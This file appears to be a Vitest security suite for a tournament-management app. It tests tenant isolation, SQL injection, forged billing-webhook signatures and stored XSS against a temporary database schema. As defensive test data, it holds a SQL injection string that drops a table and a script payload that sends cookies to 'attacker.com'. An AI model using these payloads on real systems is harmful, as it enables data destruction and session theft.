import { randomUUID } from "node:crypto";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { dropTestSchema, migrateDatabase } from "@matchday/database";
import type { PostgresJsSql } from "@matchday/identity";
import postgres, { type Sql } from "postgres";
import { EntitlementRuntime } from "../../src/entitlement-runtime.js";
import { Phase3Runtime } from "../../src/phase-3-runtime.js";
import { phase3DomainAdapter } from "../../src/phase-3-domain-adapter.js";

const describeInfrastructure = process.env.RUN_INFRA_TESTS === "1" ? describe : describe.skip;
const databaseUrl = process.env.DATABASE_URL ?? "postgres://matchday:matchday@127.0.0.1:5432/matchday";
const schema = `test_phase7_owasp_${randomUUID().replaceAll("-", "")}`;
const migrationsDirectory = path.resolve(
  path.dirname(fileURLToPath(import.meta.url)),
  "../../../../packages/database/migrations",
);

let client!: Sql;
let entitlementRuntime!: EntitlementRuntime;
let phase3Runtime!: Phase3Runtime;

let tenantA_orgId = "";
let tenantA_userId = "";
let tenantB_orgId = "";
let tenantB_userId = "";

describeInfrastructure("QA-014 — Production-Path OWASP Top 10 Security Suite", () => {
  beforeAll(async () => {
    await dropTestSchema(databaseUrl, schema);
    await migrateDatabase({ databaseUrl, migrationsDirectory, schema });
    client = postgres(databaseUrl, {
      max: 8,
      onnotice: () => undefined,
      connection: { search_path: schema },
    });

    entitlementRuntime = new EntitlementRuntime(client as unknown as PostgresJsSql);
    phase3Runtime = new Phase3Runtime(client as unknown as PostgresJsSql, phase3DomainAdapter);

    tenantA_orgId = randomUUID();
    tenantA_userId = randomUUID();
    tenantB_orgId = randomUUID();
    tenantB_userId = randomUUID();

    await client`
      INSERT INTO accounts (id, primary_email, display_name, email_verified_at)
      VALUES
        (${tenantA_userId}, 'alice@org-a.com', 'Alice A', now()),
        (${tenantB_userId}, 'bob@org-b.com', 'Bob B', now());
    `;

    await client`
      INSERT INTO organisations (id, name, slug)
      VALUES
        (${tenantA_orgId}, 'Org Alpha', 'org-alpha'),
        (${tenantB_orgId}, 'Org Beta', 'org-beta');
    `;

    await client`
      INSERT INTO organisation_memberships (organisation_id, account_id, role, status)
      VALUES
        (${tenantA_orgId}, ${tenantA_userId}, 'owner', 'active'),
        (${tenantB_orgId}, ${tenantB_userId}, 'owner', 'active');
    `;
  });

  afterAll(async () => {
    if (client) {
      await client.end({ timeout: 2 });
    }
    await dropTestSchema(databaseUrl, schema);
  });

  describe("A01: Broken Access Control (IDOR & Tenant Isolation)", () => {
    it("strictly blocks Tenant A from mutating Tenant B competitions", async () => {
      const compB = await phase3Runtime.createCompetition(
        { accountId: tenantB_userId },
        {
          organisationId: tenantB_orgId,
          name: "Tenant B Private Tournament",
          slug: `tenant-b-tourney-${randomUUID()}`,
          sportCode: "volleyball",
          timezone: "UTC",
          startsOn: "2026-09-01",
          endsOn: "2026-09-02",
          venue: "Main Hall",
          address: "1 Sports Rd",
          countryCode: "SG",
          locale: "en-SG",
        },
        randomUUID(),
      );

      expect(compB.id).toBeDefined();

      // Tenant A attempts to update Tenant B's competition
      await expect(
        phase3Runtime.mutateCompetition(
          { accountId: tenantA_userId },
          compB.id,
          {
            action: "update",
            revision: 1,
            patch: { name: "Malicious Hijack" },
          },
          randomUUID(),
        ),
      ).rejects.toThrow();
    });
  });

  describe("A03: Injection (SQL Injection Resistance)", () => {
    it("parameterizes malicious SQL payloads without executing arbitrary commands", async () => {
      const sqliPayload = "Tournament'); DROP TABLE competitions; --";

      const comp = await phase3Runtime.createCompetition(
        { accountId: tenantA_userId },
        {
          organisationId: tenantA_orgId,
          name: sqliPayload,
          slug: `sqli-test-${randomUUID()}`,
          sportCode: "volleyball",
          timezone: "UTC",
          startsOn: "2026-09-01",
          endsOn: "2026-09-02",
          venue: "Hall A",
          address: "1 Rd",
          countryCode: "SG",
          locale: "en-SG",
        },
        randomUUID(),
      );

      expect(comp.id).toBeDefined();

      const checkTable = await client`SELECT count(*)::int as count FROM competitions WHERE id = ${comp.id};`;
      expect(checkTable[0]!.count).toBe(1);
    });
  });

  describe("A07: Identification and Authentication Failures (Webhook HMAC Security)", () => {
    it("rejects forged billing webhook signatures", async () => {
      const secret = "whsec_test_secret_12345";
      const payload = {
        id: `evt_${randomUUID()}`,
        type: "checkout.session.completed",
        data: {
          object: {
            id: "cs_12345",
            metadata: { organisation_id: tenantA_orgId, tier: "organiser_pro" },
          },
        },
      };

      const rawPayload = JSON.stringify(payload);
      const forgedSignature = "v1,bad_forged_hmac_signature";

      await expect(
        entitlementRuntime.processBillingWebhook(forgedSignature, rawPayload, payload, secret),
      ).rejects.toThrow();
    });
  });

  describe("A08: Software and Data Integrity Failures (Cross-Site Scripting XSS)", () => {
    it("stores script tags as literal data without execution vulnerabilities", async () => {
      const xssPayload = "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>";

      const comp = await phase3Runtime.createCompetition(
        { accountId: tenantA_userId },
        {
          organisationId: tenantA_orgId,
          name: xssPayload,
          slug: `xss-test-${randomUUID()}`,
          sportCode: "volleyball",
          timezone: "UTC",
          startsOn: "2026-09-01",
          endsOn: "2026-09-02",
          venue: "Hall B",
          address: "2 Rd",
          countryCode: "SG",
          locale: "en-SG",
        },
        randomUUID(),
      );

      const row = await client`SELECT name FROM competitions WHERE id = ${comp.id};`;
      expect(row[0]!.name).toBe(xssPayload);
    });
  });
});
